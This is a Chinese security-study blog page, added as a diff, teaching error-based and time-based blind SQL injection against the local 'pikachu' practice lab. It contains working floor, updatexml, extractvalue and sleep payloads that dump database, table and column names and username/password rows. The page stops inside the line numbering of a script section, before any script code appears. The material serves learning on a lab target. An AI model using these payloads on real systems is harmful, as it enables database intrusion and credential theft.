@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Al0nez" />
+
+
+
+<meta name="description" content="前言当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL 语句大概写法也能更好的选择对应的注入语句。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="16WEB漏洞--SQL注入之查询方式及报错盲注">
+<meta property="og:url" content="https://al0nez.github.io/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="Al0nez&#39;s Bolg">
+<meta property="og:description" content="前言当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL 语句大概写法也能更好的选择对应的注入语句。">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105995.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105180.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105683.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105450.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106721.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106317.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105013.png">
+<meta property="article:published_time" content="2021-09-21T02:29:31.000Z">
+<meta property="article:modified_time" content="2021-09-21T03:22:29.847Z">
+<meta property="article:author" content="Al0nez">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="小迪学习笔记">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105995.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Al0nez&#39;s Bolg" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>16WEB漏洞--SQL注入之查询方式及报错盲注 | Al0nez&#39;s Bolg</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Al0nez</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="#" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Al0nez</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Al0nez</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="#" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-16WEB漏洞-SQL注入之查询方式及报错盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" class="article-date">
+      <time datetime="2021-09-21T02:29:31.000Z" itemprop="datePublished">2021-09-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      16WEB漏洞--SQL注入之查询方式及报错盲注
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">小迪学习笔记</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL 语句大概写法也能更好的选择对应的注入语句。</p>
+<span id="more"></span>
+
+<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>在网站应用中进行数据显示查询效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 列名称 或 * from 表名称 where 字段1=&#x27;条件1&#x27; and 字段2=&#x27;条件2&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>在网站应用中进行用户注册添加等操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table name(列1,列2 ...) values(值1,值2)</span><br></pre></td></tr></table></figure>
+
+<h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>会员或后台中心数据同步或缓存等操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名称 set 列名称=新值 where 列名称=某值</span><br></pre></td></tr></table></figure>
+
+<h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>后台管理里面删除文章删除用户等操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名称 where 列名称=值</span><br></pre></td></tr></table></figure>
+
+<h4 id="order-by-排序数据"><a href="#order-by-排序数据" class="headerlink" title="order by 排序数据"></a>order by 排序数据</h4><p>一般结合表名或列名进行数据排序操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 列名称 或 * from 表名称 order by 列名</span><br></pre></td></tr></table></figure>
+
+<h4 id="重点理解："><a href="#重点理解：" class="headerlink" title="重点理解："></a>重点理解：</h4><p>我们可以通过以上查询方式与网站应用的关系</p>
+<p>注入点产生地方或应用猜测到对方的 SQL 查询方式</p>
+<h3 id="SQL-注入报错盲注"><a href="#SQL-注入报错盲注" class="headerlink" title="SQL 注入报错盲注"></a>SQL 注入报错盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<p>基于布尔的 SQL 盲注-逻辑判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp,like,ascii,left,ord,mid</span><br></pre></td></tr></table></figure>
+
+<p>基于时间的 SQL 盲注-延时判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if,sleep</span><br></pre></td></tr></table></figure>
+
+<p>基于报错的 SQL 盲注-报错回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">floor，updatexml，extractvalue</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于报错的-SQL-盲注-报错回显"><a href="#基于报错的-SQL-盲注-报错回显" class="headerlink" title="基于报错的 SQL 盲注-报错回显"></a>基于报错的 SQL 盲注-报错回显</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用报错注入函数:floor，updatexml，extractvalue</span><br></pre></td></tr></table></figure>
+
+<h4 id="floor报错注入（64显示位限制）"><a href="#floor报错注入（64显示位限制）" class="headerlink" title="floor报错注入（64显示位限制）"></a>floor报错注入（64显示位限制）</h4><p><strong>原理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/zpy1998zpy/article/details/80650540</span><br><span class="line">https://www.freebuf.com/column/235496.html</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<p>小迪讲的那个有点麻烦，我简化了一下</p>
+<p>查数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105995.png" alt="image-20210828161850724"></p>
+<p>查表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105180.png" alt="image-20210828163633404"></p>
+<p>查列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105683.png" alt="image-20210828163806607"></p>
+<p>查数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,concat(username,0x7e,password),0x7e) from pikachu.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105450.png" alt="image-20210828164159225"></p>
+<h4 id="updatexml报错注入（32显示位限制）"><a href="#updatexml报错注入（32显示位限制）" class="headerlink" title="updatexml报错注入（32显示位限制）"></a>updatexml报错注入（32显示位限制）</h4><p><strong>原理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881140/article/details/89565706</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<p>查数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>查表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 3,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106721.png" alt="image-20210828165528886"></p>
+<p>查列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106317.png" alt="image-20210828165928071"></p>
+<p>查数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from pikachu.users limit 0,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105013.png" alt="image-20210828170043295"></p>
+<h4 id="extractvalue报错注入（32显示位限制）"><a href="#extractvalue报错注入（32显示位限制）" class="headerlink" title="extractvalue报错注入（32显示位限制）"></a>extractvalue报错注入（32显示位限制）</h4><p><strong>原理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881140/article/details/89565706</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<p>查数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1 &#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>后面的和updatexml差不多，需要注意的是extractvalue只有俩个参数</p>
+<h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><p>刚才上面是通过insert进行的注入，这里试一下update，原理一样这里就查一下数据库名，其他的看上面。</p>
+<h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<h4 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h4><p>GET方式的话，如果是在burp suite中去进行注入，需要将空格改为加号或者%20。POST则不需要</p>
+<h5 id="floor-1"><a href="#floor-1" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<h5 id="updatexml-1"><a href="#updatexml-1" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<h5 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间的-SQL-盲注-延时判断"><a href="#基于时间的-SQL-盲注-延时判断" class="headerlink" title="基于时间的 SQL 盲注-延时判断"></a>基于时间的 SQL 盲注-延时判断</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;                      #判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^xiaodi[1-z]&#x27;    #匹配xiaodi及xiaodi...等</span><br><span class="line">if(条件,5,0)                   #条件成立，返回5，反之，返回0</span><br><span class="line">sleep(5)                       #SQL语句延时执行5秒</span><br><span class="line">mid(a,b,c)                    #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)                #从B位置开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database()    #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8   #判断数据库database()名的长度</span><br><span class="line">ascii() 字符串转换ascii码</span><br><span class="line">ord     ascii码转换为数字</span><br><span class="line">ord=ascii ascii(x)=97   #判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
+
+<p>页面错误和正确返回一样。一般都用脚本跑</p>
+<h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：if(ascii(substr(database(),1,1))=114,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>查看表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit    0,1),1,1))=101,sleep(3),0)--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span 